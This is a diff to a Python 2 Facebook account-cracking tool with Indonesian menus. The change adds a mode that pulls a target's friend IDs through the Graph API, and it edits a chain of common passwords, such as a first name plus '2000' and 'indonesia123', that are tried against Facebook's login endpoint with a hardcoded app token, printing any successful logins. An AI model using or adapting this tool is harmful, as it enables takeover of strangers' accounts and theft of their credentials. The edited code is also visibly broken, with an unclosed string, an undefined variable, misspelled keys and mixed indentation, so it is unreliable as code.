@@ -543,8 +543,9 @@ def super():
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Crack dari daftar Teman'
     print '\x1b[1;37;40m2. Crack dari member Grup'
+	print '\x1b[1;37;40m3. Crack dari Friend Teman
     print '\x1b[1;31;40m0. Kembali'
-    print
+    print '\xe2\x95\x91'
     pilih_super()
 
 
@@ -582,6 +583,26 @@ def pilih_super():
                 re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                 s = json.loads(re.text)
                 for i in s['data']:
+                    id.append(i['id'])
+
+            else:
+				if peak == '3':
+                os.system('clear')
+                print logo
+                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
+                try:
+                    r = requests.get('https://graph.facebook.com/' + idg + '$access_token=' + toket)
+                    asw = json.loads(jok.text)
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + asw['name']
+                except KeyError:
+                    print '\x1b[1;91m[!] Friend not found'
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                    super()
+
+                jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
+                r = requests.get('https://graph.facebook.com/' + idg + '/friends?access_token=' + toket)
+                z = json.loads(r.text)
+                for i in z['data']:
                     id.append(i['id'])
 
             else:
@@ -642,7 +663,7 @@ def pilih_super():
 										if 'www.facebook.com' in q['error_msg']:
 											print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
 										else:
-											pass5 = b['first_name'] + '2000'
+											pass5 = b['frist_name'] + '2000'
 											data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 											q = json.load(data)
 											if 'access_token' in q:
@@ -651,7 +672,7 @@ def pilih_super():
 												if 'www.facebook.com' in q['error_msg']:
 													print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
 												else:
-													pass6 = 'akusayangkamu'
+													pass6 = b['akusayangkamu']
 													data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 													q = json.load(data)
 													if 'access_token' in q:
@@ -660,7 +681,7 @@ def pilih_super():
 														if 'www.facebook.com' in q['error_msg']:
 															print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6
 														else:
-															pass7 = 'indonesia' + '123'
+															pass7 = b['indonesia'] + '123'
 															data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 															q = json.load(data)
 															if 'access_token' in q:
@@ -669,7 +690,7 @@ def pilih_super():
 																if 'www.facebook.com' in q['error_msg']:
 																	print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass7
 																else:
-																	pass8 = 'sayang'
+																	pass8 = b['indonesia'] + '12345'
 																	data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 																	q = json.load(data)
 																	if 'access_token' in q:
@@ -678,7 +699,7 @@ def pilih_super():
 																		if 'www.facebook.com' in q['error_msg']:
 																			print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass8
 																		else:
-																			pass9 = 'indonesia'
+																			pass9 = b['indonesia']
 																			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 																			q = json.load(data)
 																			if 'access_token' in q:
